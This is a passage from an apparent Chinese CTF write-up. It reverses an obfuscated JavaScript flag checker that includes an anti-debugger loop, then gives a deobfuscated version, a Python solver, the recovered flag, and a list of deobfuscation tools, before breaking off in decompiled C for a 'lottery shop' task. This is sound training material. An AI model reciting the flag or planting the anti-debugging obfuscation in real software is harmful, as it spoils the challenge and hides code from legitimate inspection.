class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    _0x139d2b();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4</span>(<span class="params">_0x431cb1, _0x516603</span>) </span>&#123;</span><br><span class="line">  ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span> &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4H4</span>(<span class="params">_0x1b81b8, _0x11e8ab, _0x2c730f</span>) </span>&#123;</span><br><span class="line">  a = _H4H4H4(_0x1b81b8, _0x2c730f);</span><br><span class="line">  a = _H4H4H4(a, _H4H4H4(~_0x11e8ab &amp; <span class="number">255</span>, _H4H4H4([], <span class="number">1</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">  a = _H4H4H4(a, _H4H4H4(~_0x2c730f &amp; <span class="number">255</span>, _H4H4H4([], <span class="number">1</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">return</span> a &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">_0x51eb06</span>) </span>&#123;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">var</span> _0x8b9e29 = <span class="built_in">document</span>.getElementById(<span class="string">&quot;passwordError&quot;</span>);</span><br><span class="line">  _0xcaf3caf3 = [];</span><br><span class="line">  _0xc4f3c4f3 = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>];</span><br><span class="line">  Hur1k = <span class="string">&quot;Hur1k&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06.length != <span class="number">39</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06.substr(<span class="number">0</span>, <span class="number">6</span>) != <span class="string">&quot;XSCTF&#123;&quot;</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06[<span class="number">38</span>] != <span class="string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _0x114514 = _0x51eb06.substr(<span class="number">6</span>, <span class="number">32</span>);</span><br><span class="line">  _0x51eb06 = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0x114514.length; _0x28db6c++) &#123;</span><br><span class="line">    _0x51eb06.push(_0x114514.charCodeAt(_0x28db6c));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Math</span>.seed = (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime();</span><br><span class="line">  <span class="built_in">Math</span>.seededRandom = <span class="function"><span class="keyword">function</span> (<span class="params">_0x14b0c9, _0x56fb11</span>) </span>&#123;</span><br><span class="line">    _0x56fb11 = _0x56fb11 || <span class="number">1</span>;</span><br><span class="line">    _0x14b0c9 = _0x14b0c9 || <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">Math</span>.seed = (<span class="built_in">Math</span>.seed * <span class="number">9301</span> + <span class="number">49297</span>) % <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">var</span> _0xee8b23 = <span class="built_in">Math</span>.seed / <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(_0x14b0c9 + _0xee8b23 * (_0x56fb11 - _0x14b0c9));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0x51eb06.length; _0x28db6c += <span class="number">2</span>) &#123;</span><br><span class="line">    tmp = _H4H4H4(_0x51eb06[_0x28db6c], _0x28db6c) ^ _0x28db6c;</span><br><span class="line">    _0xcaf3caf3.push(tmp);</span><br><span class="line">    randNum = <span class="built_in">Math</span>.seededRandom(<span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">Math</span>.seed = randNum;</span><br><span class="line">    tmp = _H4H4H4H4(tmp ^ _0x51eb06[_0x28db6c + <span class="number">1</span>], Hur1k.charCodeAt([_0x28db6c / <span class="number">2</span> % Hur1k.length]), randNum);</span><br><span class="line">    _0xcaf3caf3.push(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">if</span> (_0xcaf3caf3.length != <span class="number">32</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;究极错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0xcaf3caf3.length; _0x28db6c++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_0xcaf3caf3[_0x28db6c] != _0xc4f3c4f3[_0x28db6c]) &#123;</span><br><span class="line">      _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是手动解</p><ul><li>从目标数组入手回溯</li><li>查看对目标数组操作的函数，尝试逆向</li><li>逆向不出来怎么办，把函数复制到控制台，传入简单的参数，然后逐个修改参数，观察函数输出</li><li>根据这个方法可以推测出<code>_H4H4H4</code>的实际作用是相加，<code>_H4H4H4H4</code>的实际功能是前两个参数相减，第三个参数是摆设</li><li>涉及到随机数的参数大概率没什么用</li></ul><p>最后手动解混淆的结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    _0x139d2b();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">_0x431cb1, _0x516603</span>) </span>&#123;</span><br><span class="line">  ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span> &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">h_a, h_b, h_c</span>) </span>&#123;</span><br><span class="line">  a = h_a + h_c + (((~h_b &amp; <span class="number">255</span>) + <span class="number">1</span>)&amp;<span class="number">255</span>) + (((~h_c &amp; <span class="number">255</span>) + <span class="number">1</span>)&amp;<span class="number">255</span>)</span><br><span class="line">  a = h_a + h_c + <span class="number">256</span>-h_b + <span class="number">256</span>-h_c</span><br><span class="line">  a = <span class="number">512</span> + h_a - h_b</span><br><span class="line">  <span class="comment">// a = add(h_a, h_c);</span></span><br><span class="line">  <span class="comment">// a = add(a, add(~h_b &amp; 255, 1) &amp; 255);</span></span><br><span class="line">  <span class="comment">// a = add(a, add(~h_c &amp; 255, 1) &amp; 255);</span></span><br><span class="line">  <span class="keyword">return</span> a &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">userinput</span>) </span>&#123;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">var</span> pass_err = <span class="built_in">document</span>.getElementById(<span class="string">&quot;passwordError&quot;</span>);</span><br><span class="line">  userin = [];</span><br><span class="line">  target = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>];</span><br><span class="line">  Hur1k = <span class="string">&quot;Hur1k&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (userinput.length != <span class="number">39</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userinput.substr(<span class="number">0</span>, <span class="number">6</span>) != <span class="string">&quot;XSCTF&#123;&quot;</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userinput[<span class="number">38</span>] != <span class="string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  in_slice = userinput.substr(<span class="number">6</span>, <span class="number">32</span>);</span><br><span class="line">  userinput = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; in_slice.length; i++) &#123;</span><br><span class="line">    userinput.push(in_slice.charCodeAt(i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Math</span>.seed = (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime();</span><br><span class="line">  <span class="built_in">Math</span>.seededRandom = <span class="function"><span class="keyword">function</span> (<span class="params">p_a, p_b</span>) </span>&#123;</span><br><span class="line">    p_b = p_b || <span class="number">1</span>;</span><br><span class="line">    p_a = p_a || <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">Math</span>.seed = (<span class="built_in">Math</span>.seed * <span class="number">9301</span> + <span class="number">49297</span>) % <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">var</span> p_seed = <span class="built_in">Math</span>.seed / <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(p_a + p_seed * (p_b - p_a));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; userinput.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">    tmp = add(userinput[i], i) ^ i;</span><br><span class="line">    userin.push(tmp);</span><br><span class="line">    randNum = <span class="built_in">Math</span>.seededRandom(<span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">Math</span>.seed = randNum;</span><br><span class="line">    tmp = sub(tmp ^ userinput[i + <span class="number">1</span>], Hur1k.charCodeAt([i / <span class="number">2</span> % Hur1k.length]), randNum);</span><br><span class="line">    userin.push(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">if</span> (userin.length != <span class="number">32</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;究极错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; userin.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (userin[i] != target[i]) &#123;</span><br><span class="line">      pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hur1k = <span class="string">&quot;Hur1k&quot;</span></span><br><span class="line">s = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>]</span><br><span class="line">charCode = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>, <span class="number">-1</span>, <span class="number">-2</span>):</span><br><span class="line">    s[i+<span class="number">1</span>] = ((s[i+<span class="number">1</span>]+<span class="built_in">ord</span>(Hur1k[charCode[i]]))&amp;<span class="number">255</span>)^s[i]</span><br><span class="line">    s[i] = (s[i]^i)-i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>UR_R341Ly_900d_47_Obfu_ur_Newn3W</code></p><p>一些解混淆的网站</p><ul><li><a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator (deobfuscate.io)</a></li><li><a href="https://deobfuscate.io/">JavaScript Deobfuscator (deobfuscate.io)</a></li><li><a href="https://www.dejs.vip/">主页 - DeJs</a></li><li><a href="https://deobfuscate.relative.im/">JavaScript Deobfuscator (relative.im)</a></li></ul><p>工具</p><ul><li>v_jstools（浏览器插件，需配置） – <a href="https://blog.csdn.net/freeking101/article/details/121668637">网页 js 逆向分析 ( v_jstools )、jshook ( 安卓上用js实现Hook )-CSDN博客</a></li></ul><h2 id="lotery-shop"><a href="#lotery-shop" class="headerlink" title="lotery shop"></a>lotery shop</h2><p>核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_140017AC0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+60h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">80</span>]; <span class="comment">// [rsp+68h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+B8h] [rbp+58h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">96</span>]; <span class="comment">// [rsp+108h] [rbp+A8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">80</span>]; <span class="comment">// [rsp+168h] [rbp+108h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">20</span>]; <span class="comment">// [rsp+1B8h] [rbp+158h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">20</span>]; <span class="comment">// [rsp+208h] [rbp+1A8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">20</span>]; <span class="comment">// [rsp+258h] [rbp+1F8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10[<span class="number">20</span>]; <span class="comment">// [rsp+2A8h] [rbp+248h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">76</span>]; <span class="comment">// [rsp+2F8h] [rbp+298h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v12[<span class="number">8</span>]; <span class="comment">// [rsp+344h] [rbp+2E4h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v13[<span class="number">19</span>]; <span class="comment">// [rsp+364h] [rbp+304h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">180</span>]; <span class="comment">// [rsp+3B0h] [rbp+350h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v15[<span class="number">148</span>]; <span class="comment">// [rsp+464h] [rbp+404h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+6B4h] [rbp+654h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v2;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">266</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140011690(&amp;unk_14002D06A);</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v13[<span class="number">8</span>] = <span class="number">10</span>;</span><br><span class="line">  j_memset(v14, <span class="number">0</span>, <span class="number">30u</span>i64);</span><br><span class="line">  v15[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_14001117C(v3, <span class="string">&quot;Sloth&#x27;s lottery shop is 